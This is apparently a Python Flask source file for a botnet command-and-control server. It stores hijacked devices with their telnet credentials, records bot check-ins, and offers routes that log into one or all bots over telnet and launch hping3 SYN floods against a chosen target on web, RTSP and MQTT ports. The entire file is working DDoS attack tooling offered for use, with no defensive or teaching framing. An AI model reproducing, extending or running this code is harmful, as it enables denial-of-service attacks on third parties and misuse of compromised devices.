from flask import Flask, request, jsonify
import logging
import threading
import time
from datetime import datetime
import os

from database import DatabaseManager
from telnet_manager import TelnetManager
from web_interface import render_dashboard, handle_bot_checkin

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('c2_server.log')
    ]
)

app = Flask(__name__)

# Initialize managers
db_manager = DatabaseManager('c2_database.db')
telnet_manager = TelnetManager()

# Global state
active_attacks = {}
attack_lock = threading.Lock()

def get_active_sessions():
    """Get count of active telnet sessions"""
    return len(telnet_manager.active_sessions)

@app.route('/')
def index():
    """Render main dashboard"""
    bots = db_manager.get_all_devices()
    scan_results = db_manager.get_latest_scan_results()
    active_sessions = get_active_sessions()
    return render_dashboard(bots, scan_results, active_sessions)

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Handle bot check-in requests"""
    return handle_bot_checkin(db_manager, request.json)

@app.route('/start-attack', methods=['POST'])
def start_attack():
    """Start attack on a single device"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')
        target = data.get('target')
        attack_type = data.get('attack_type')

        if not all([bot_ip, target, attack_type]):
            return jsonify({'error': 'Missing required parameters'}), 400

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            return jsonify({'error': 'Invalid attack type'}), 400

        # Get device credentials
        device = db_manager.get_device(bot_ip)
        if not device:
            return jsonify({'error': 'Device not found'}), 404

        # Prepare attack command based on type
        if attack_type == 'syn':
            cmd = f"hping3 -S -p 80 -c 1000 {target}"
        elif attack_type == 'rtsp':
            cmd = f"hping3 -S -p 554 -c 1000 {target}"
        else:  # mqtt
            cmd = f"hping3 -S -p 1883 -c 1000 {target}"

        # Execute attack via telnet
        session = telnet_manager.execute_telnet_login_and_send(
            bot_ip, device['username'], device['password'], cmd
        )

        if session:
            with attack_lock:
                active_attacks[bot_ip] = {
                    'target': target,
                    'type': attack_type,
                    'start_time': datetime.now(),
                    'session': session
                }
            logging.info(f"Started {attack_type} attack from {bot_ip} to {target}")
            return jsonify({'status': 'success', 'message': 'Attack started'})
        else:
            return jsonify({'error': 'Failed to establish telnet connection'}), 500

    except Exception as e:
        logging.error(f"Error starting attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    """Stop attack on a single device"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')

        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400

        with attack_lock:
            if bot_ip in active_attacks:
                session = active_attacks[bot_ip]['session']
                telnet_manager.close_session(session)
                del active_attacks[bot_ip]
                logging.info(f"Stopped attack from {bot_ip}")
                return jsonify({'message': 'Attack stopped'})
            else:
                return jsonify({'message': 'No active attack found'})

    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-telnet-ddos', methods=['POST'])
def start_telnet_ddos():
    """Start DDoS attack on all devices"""
    try:
        data = request.json
        target = data.get('target')
        attack_type = data.get('attack_type')

        if not all([target, attack_type]):
            return jsonify({'error': 'Missing required parameters'}), 400

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            return jsonify({'error': 'Invalid attack type'}), 400

        # Get all online devices
        devices = db_manager.get_online_devices()
        if not devices:
            return jsonify({'error': 'No online devices available'}), 404

        success_count = 0
        for device in devices:
            try:
                # Prepare attack command
                if attack_type == 'syn':
                    cmd = f"hping3 -S -p 80 -c 1000 {target}"
                elif attack_type == 'rtsp':
                    cmd = f"hping3 -S -p 554 -c 1000 {target}"
                else:  # mqtt
                    cmd = f"hping3 -S -p 1883 -c 1000 {target}"

                # Execute attack
                session = telnet_manager.execute_telnet_login_and_send(
                    device['ip'], device['username'], device['password'], cmd
                )

                if session:
                    with attack_lock:
                        active_attacks[device['ip']] = {
                            'target': target,
                            'type': attack_type,
                            'start_time': datetime.now(),
                            'session': session
                        }
                    success_count += 1

            except Exception as e:
                logging.error(f"Error starting attack on {device['ip']}: {e}")
                continue

        if success_count > 0:
            msg = f"Started {attack_type} attack on {success_count} devices against {target}"
            logging.info(msg)
            return jsonify({'status': 'success', 'message': msg})
        else:
            return jsonify({'error': 'Failed to start attacks on any device'}), 500

    except Exception as e:
        logging.error(f"Error in bulk attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stop-telnet-ddos', methods=['POST'])
def stop_telnet_ddos():
    """Stop all active attacks"""
    try:
        with attack_lock:
            if not active_attacks:
                return jsonify({'message': 'No active attacks'})

            # Close all sessions
            for bot_ip, attack_info in active_attacks.items():
                try:
                    session = attack_info['session']
                    telnet_manager.close_session(session)
                except Exception as e:
                    logging.error(f"Error closing session for {bot_ip}: {e}")

            # Clear active attacks
            active_attacks.clear()
            logging.info("Stopped all active attacks")
            return jsonify({'message': 'All attacks stopped'})

    except Exception as e:
        logging.error(f"Error stopping all attacks: {e}")
        return jsonify({'error': str(e)}), 500

def cleanup_inactive_sessions():
    """Periodically clean up inactive sessions"""
    while True:
        try:
            with attack_lock:
                current_time = datetime.now()
                to_remove = []

                for bot_ip, attack_info in active_attacks.items():
                    # Remove sessions older than 1 hour
                    if (current_time - attack_info['start_time']).total_seconds() > 3600:
                        try:
                            session = attack_info['session']
                            telnet_manager.close_session(session)
                            to_remove.append(bot_ip)
                        except Exception as e:
                            logging.error(f"Error cleaning up session for {bot_ip}: {e}")

                for bot_ip in to_remove:
                    del active_attacks[bot_ip]

        except Exception as e:
            logging.error(f"Error in cleanup thread: {e}")

        time.sleep(300)  # Check every 5 minutes

if __name__ == '__main__':
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_inactive_sessions, daemon=True)
    cleanup_thread.start()

    # Start Flask server
    app.run(host='0.0.0.0', port=5000, debug=False) 